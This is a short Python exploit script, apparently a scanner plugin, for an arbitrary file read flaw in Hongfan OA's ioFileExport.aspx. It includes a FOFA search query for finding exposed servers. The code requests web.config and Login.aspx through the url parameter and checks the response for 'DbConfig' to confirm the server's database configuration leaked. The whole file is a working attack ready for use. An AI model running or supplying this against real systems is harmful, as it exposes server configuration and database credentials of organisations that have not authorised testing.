#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/红帆OA/红帆OA ioFileExport.aspx 任意文件读取漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '红帆OA IOFILE任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   'app="红帆-ioffice"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream','ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream']
  url1 = url + targets[0]
  url2 = url + targets[1]
    #ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "DbConfig" in res.text:
      ret['ifbug'] = True
      ret['url'] = url1
      res.close()
      return ret
  except:
    pass
  try:
    resp=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if resp.status_code == 200 and "DbConfig" in resp.text:
      ret['url'] = url2
      ret['ifbug'] = True
      resp.close()
      return ret
    else:
      return ret
  except:
    return ret